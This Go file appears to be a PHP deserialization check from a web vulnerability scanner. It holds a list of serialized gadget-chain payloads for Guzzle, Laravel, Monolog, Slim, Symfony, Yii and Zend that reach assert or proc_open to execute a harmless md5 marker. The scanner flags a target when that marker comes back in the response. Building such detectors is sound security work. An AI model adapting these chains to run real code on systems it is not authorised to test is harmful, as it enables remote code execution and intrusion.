package deserialization

import (
	"errors"
	"glint/ast"
	"glint/nenet"
	"glint/pkg/layers"
	"glint/plugin"
	"glint/util"
	"regexp"
	"time"

	"github.com/thoas/go-funk"
)

var PlainArray = []string{
	`ab49bdd251591b16da541abad631329c`,
	`<title>phpinfo()</title>`,
	//`2e882622f2d28c708b8126cdfba22252`,
}

var RegexArray = []string{
	`^[O]:\d+:"[^"]+":\d+:{.*}`,
	`^a:\d+:{(s:\d:"[^"]+";|i:\d+;).*}`,
	`^Tzo[A-Za-z0-9+\/=]{10,}`,
	`^YTo[A-Za-z0-9+\/=]{10,}`,
}

type classPhpDeserializa struct {
	scheme                 layers.Scheme
	TargetUrl              string
	inputIndex             int
	reflectionPoint        int
	disableSensorBased     bool
	currentVariation       int
	foundVulnOnVariation   bool
	variations             *util.Variations
	lastJob                layers.LastJob
	lastJobProof           interface{}
	scanningWAVSEP         bool
	scanningOwaspBenchmark bool
	isUnix                 bool
	isWindows              bool
	isJava                 bool
	TruePayload            string
	isUnknown              bool
}

func PHPDeserializaValid(args *plugin.GroupData) (*util.ScanResult, bool, error) {
	var err error
	var variations *util.Variations

	var CclassDeserializa classPhpDeserializa
	//var hostid int64
	// var blastIters interface{}
	util.Setup()
	var Param layers.PluginParam
	// layers.Init()
	ct := layers.CheckType{}
	gd := args
	Param.ParsePluginParams(args, ct)
	if Param.CheckForExitSignal() {
		return nil, false, errors.New("receive task exit signal")
	}

	sess := nenet.GetSessionByOptions(
		&nenet.ReqOptions{
			Timeout:       time.Duration(Param.Timeout) * time.Second,
			RetryTimes:    Param.MaxRedirectTimes,
			AllowRedirect: false,
			Proxy:         Param.UpProxy,
			Cert:          Param.Cert,
			PrivateKey:    Param.CertKey,
		})

	CclassDeserializa.lastJob.Init(Param)
	// variations,err = util.ParseUri(url)
	// BlindSQL.variations =
	if value, ok := Param.Headers["Content-Type"]; ok {
		Param.ContentType = value
	}
	variations, err = util.ParseUri(Param.Url, []byte(Param.Body), Param.Method, Param.ContentType, Param.Headers)
	//赋值
	CclassDeserializa.variations = variations
	CclassDeserializa.lastJob.Layer.Sess = sess
	CclassDeserializa.TargetUrl = Param.Url
	CclassDeserializa.lastJob.Layer.Method = Param.Method
	CclassDeserializa.lastJob.Layer.ContentType = Param.ContentType
	CclassDeserializa.lastJob.Layer.Headers = Param.Headers
	CclassDeserializa.lastJob.Layer.Body = []byte(Param.Body)

	phpinfo := args
	Spider := phpinfo.Spider
	ctx := *phpinfo.Pctx

	Spider.TaskCtx = &ctx
	tabs_obj, err := nenet.NewTabsOBJ(Spider)
	if err != nil {
		return nil, false, err
	}
	defer tabs_obj.Close()

	headers := util.InterfaceToString(Param.Headers)
	ju := ast.JsonUrl{Url: Param.Url, MetHod: Param.Method, Headers: headers, Data: Param.Body}
	tabs_obj.CopyRequest(&ju)

	// sess := nenet.GetSessionByOptions(
	// 	&nenet.ReqOptions{
	// 		Timeout:       time.Duration(Param.Timeout) * time.Second,
	// 		AllowRedirect: false,
	// 		Proxy:         Param.UpProxy,
	// 		Cert:          Param.Cert,
	// 		PrivateKey:    Param.CertKey,
	// 	})

	if CclassDeserializa.startTesting() {
		Result := util.VulnerableTcpOrUdpResult(Param.Url,
			"The Php Deserialization inject vulnerability has found",
			[]string{string(CclassDeserializa.lastJob.Features.Request.String())},
			[]string{string(CclassDeserializa.lastJob.Features.Response.String())},
			"high",
			Param.Hostid, string(plugin.Deserialization))
		gd.Alert(Result)
		return Result, true, err
	}
	return nil, false, errors.New("Php Deserialization vulnerability found")
}

func (c *classPhpDeserializa) startTesting() bool {
	c.isUnknown = true
	var php_payload_list = []string{
		`O:24:"GuzzleHttp\Psr7\FnStream":2:{s:33:" GuzzleHttp\Psr7\FnStream methods";a:1:{s:5:"close";a:2:{i:0;O:23:"GuzzleHttp\HandlerStack":3:{s:32:" GuzzleHttp\HandlerStack handler";s:23:"print(md5(4085809348));";s:30:" GuzzleHttp\HandlerStack stack";a:1:{i:0;a:1:{i:0;s:6:"assert";}}s:31:" GuzzleHttp\HandlerStack cached";b:0;}i:1;s:7:"resolve";}}s:9:"_fn_close";a:2:{i:0;r:4;i:1;s:7:"resolve";}}`,
		`O:40:"Illuminate\Broadcasting\PendingBroadcast":2:{s:9:" * events";O:15:"Faker\Generator":1:{s:13:" * formatters";a:1:{s:8:"dispatch";s:6:"assert";}}s:8:" * event";s:23:"print(md5(4085809348));";}`,
		`O:40:"Illuminate\Broadcasting\PendingBroadcast":2:{s:9:" * events";O:28:"Illuminate\Events\Dispatcher":1:{s:12:" * listeners";a:1:{s:23:"print(md5(4085809348));";a:1:{i:0;s:6:"assert";}}}s:8:" * event";s:23:"print(md5(4085809348));";}`,
		`O:40:"Illuminate\Broadcasting\PendingBroadcast":1:{s:9:" * events";O:39:"Illuminate\Notifications\ChannelManager":3:{s:6:" * app";s:23:"print(md5(4085809348));";s:17:" * defaultChannel";s:1:"x";s:17:" * customCreators";a:1:{s:1:"x";s:6:"assert";}}}`,
		`O:40:"Illuminate\Broadcasting\PendingBroadcast":2:{s:9:" * events";O:31:"Illuminate\Validation\Validator":1:{s:10:"extensions";a:1:{s:0:"";s:6:"assert";}}s:8:" * event";s:23:"print(md5(4085809348));";}`,
		`O:32:"Monolog\Handler\SyslogUdpHandler":1:{s:9:" * socket";O:29:"Monolog\Handler\BufferHandler":7:{s:10:" * handler";O:29:"Monolog\Handler\BufferHandler":7:{s:10:" * handler";N;s:13:" * bufferSize";i:-1;s:9:" * buffer";a:1:{i:0;a:2:{i:0;s:23:"print(md5(4085809348));";s:5:"level";N;}}s:8:" * level";N;s:14:" * initialized";b:1;s:14:" * bufferLimit";i:-1;s:13:" * processors";a:2:{i:0;s:7:"current";i:1;s:6:"assert";}}s:13:" * bufferSize";i:-1;s:9:" * buffer";a:1:{i:0;a:2:{i:0;s:23:"print(md5(4085809348));";s:5:"level";N;}}s:8:" * level";N;s:14:" * initialized";b:1;s:14:" * bufferLimit";i:-1;s:13:" * processors";a:2:{i:0;s:7:"current";i:1;s:6:"assert";}}}`,
		`O:32:"Monolog\Handler\SyslogUdpHandler":1:{s:6:"socket";O:29:"Monolog\Handler\BufferHandler":7:{s:10:" * handler";O:29:"Monolog\Handler\BufferHandler":7:{s:10:" * handler";N;s:13:" * bufferSize";i:-1;s:9:" * buffer";a:1:{i:0;a:2:{i:0;s:23:"print(md5(4085809348));";s:5:"level";N;}}s:8:" * level";N;s:14:" * initialized";b:1;s:14:" * bufferLimit";i:-1;s:13:" * processors";a:2:{i:0;s:7:"current";i:1;s:6:"assert";}}s:13:" * bufferSize";i:-1;s:9:" * buffer";a:1:{i:0;a:2:{i:0;s:23:"print(md5(4085809348));";s:5:"level";N;}}s:8:" * level";N;s:14:" * initialized";b:1;s:14:" * bufferLimit";i:-1;s:13:" * processors";a:2:{i:0;s:7:"current";i:1;s:6:"assert";}}}`,
		`O:18:"Slim\Http\Response":2:{s:10:" * headers";O:8:"Slim\App":1:{s:19:" Slim\App container";O:14:"Slim\Container":3:{s:21:" Pimple\Container raw";a:1:{s:3:"all";a:2:{i:0;O:8:"Slim\App":1:{s:19:" Slim\App container";O:8:"Slim\App":1:{s:19:" Slim\App container";O:14:"Slim\Container":3:{s:21:" Pimple\Container raw";a:1:{s:3:"has";s:6:"assert";}s:24:" Pimple\Container values";a:1:{s:3:"has";s:6:"assert";}s:22:" Pimple\Container keys";a:1:{s:3:"has";s:6:"assert";}}}}i:1;s:23:"print(md5(4085809348));";}}s:24:" Pimple\Container values";a:1:{s:3:"all";a:2:{i:0;r:6;i:1;s:23:"print(md5(4085809348));";}}s:22:" Pimple\Container keys";a:1:{s:3:"all";a:2:{i:0;r:6;i:1;s:23:"print(md5(4085809348));";}}}}s:7:" * body";s:0:"";}`,
		`O:43:"Symfony\Component\Cache\Adapter\ApcuAdapter":3:{s:64:" Symfony\Component\Cache\Adapter\AbstractAdapter mergeByLifetime";s:9:"proc_open";s:58:" Symfony\Component\Cache\Adapter\AbstractAdapter namespace";a:0:{}s:57:" Symfony\Component\Cache\Adapter\AbstractAdapter deferred";s:23:"print(md5(4085809348));";}`,
		`O:38:"Symfony\Component\Process\ProcessPipes":1:{s:45:" Symfony\Component\Process\ProcessPipes files";a:1:{i:0;O:46:"Symfony\Component\Finder\Expression\Expression":1:{s:53:" Symfony\Component\Finder\Expression\Expression value";O:38:"Symfony\Component\Templating\PhpEngine":4:{s:9:" * parser";O:47:"Symfony\Component\Templating\TemplateNameParser":0:{}s:8:" * cache";a:1:{s:0:"";O:50:"Symfony\Component\Templating\Storage\StringStorage":1:{s:11:" * template";s:39:"<?php+print(md5(4085809348));;die();+?>";}}s:10:" * current";O:46:"Symfony\Component\Templating\TemplateReference":0:{}s:10:" * globals";a:0:{}}}}}`,
		`O:44:"Symfony\Component\Process\Pipes\WindowsPipes":1:{s:51:" Symfony\Component\Process\Pipes\WindowsPipes files";a:1:{i:0;O:46:"Symfony\Component\Finder\Expression\Expression":1:{s:53:" Symfony\Component\Finder\Expression\Expression value";O:38:"Symfony\Component\Templating\PhpEngine":4:{s:9:" * parser";O:47:"Symfony\Component\Templating\TemplateNameParser":0:{}s:8:" * cache";a:1:{s:0:"";O:50:"Symfony\Component\Templating\Storage\StringStorage":1:{s:11:" * template";s:39:"<?php+print(md5(4085809348));;die();+?>";}}s:10:" * current";O:46:"Symfony\Component\Templating\TemplateReference":0:{}s:10:" * globals";a:0:{}}}}}`,
		`O:11:"CDbCriteria":1:{s:6:"params";O:5:"CList":1:{s:9:" CList _d";O:10:"CFileCache":7:{s:9:"keyPrefix";s:0:"";s:7:"hashKey";b:0;s:10:"serializer";a:1:{i:1;s:6:"assert";}s:9:"cachePath";s:10:"data:text/";s:14:"directoryLevel";i:0;s:11:"embedExpiry";b:1;s:15:"cacheFileSuffix";s:52:";base64,OTk5OTk5OTk5OXByaW50KG1kNSg0MDg1ODA5MzQ4KSk7";}}}`,
		`O:8:"Zend_Log":1:{s:11:" * _writers";a:1:{i:0;O:20:"Zend_Log_Writer_Mail":5:{s:16:" * _eventsToMail";a:1:{i:0;i:1;}s:22:" * _layoutEventsToMail";a:0:{}s:8:" * _mail";O:9:"Zend_Mail":0:{}s:10:" * _layout";O:11:"Zend_Layout":3:{s:13:" * _inflector";O:23:"Zend_Filter_PregReplace":2:{s:16:" * _matchPattern";s:7:"/(.*)/e";s:15:" * _replacement";s:23:"print(md5(4085809348));";}s:20:" * _inflectorEnabled";b:1;s:10:" * _layout";s:6:"layout";}s:22:" * _subjectPrependText";N;}}}`,
		`O:1:"S":1:{s:4:"test";s:140:"<script>var div=document.createElement('div');div.innerText = 'ab49bdd251591b16da'+'541abad631329c';document.body.appendChild(div);</script>";}`,
	}

	if c.variations != nil {
		for _, p := range c.variations.Params {
			//fmt.Println(p.Name, p.Value)
			if c.foundVulnOnVariation {
				break
			}
			for _, payload := range php_payload_list {
				// println(payload)
				// s1 := strings.ReplaceAll(payload, "{domain}", _reverse.Url)
				// response_strarray, requeststr, err := tabs_obj.CheckPayloadLocation(payload)
				// if err != nil {
				// 	return nil, tabs_obj
				// }

				options := make(map[string]string)
				options["encode"] = "encode"
				Features, err := c.lastJob.RequestByIndex(p.Index, c.TargetUrl, []byte(payload), options)
				if err != nil {
					return false
				}

				respbody := Features.Response.String()
				for _, Regex := range RegexArray {
					RE, _ := regexp.Compile(Regex)
					ips := RE.FindAllString(respbody, -1)
					if len(ips) != 0 {
						c.TruePayload = payload
						return true
					}
				}

				for _, Plain := range PlainArray {
					if funk.Contains(respbody, Plain) {
						c.TruePayload = payload
						return true
					}
				}

				// if reverse2.ReverseCheck(reverse, 3) {
				// 	c.foundVulnOnVariation = true
				// 	return true
				// }
			}
		}
	}
	return false
}
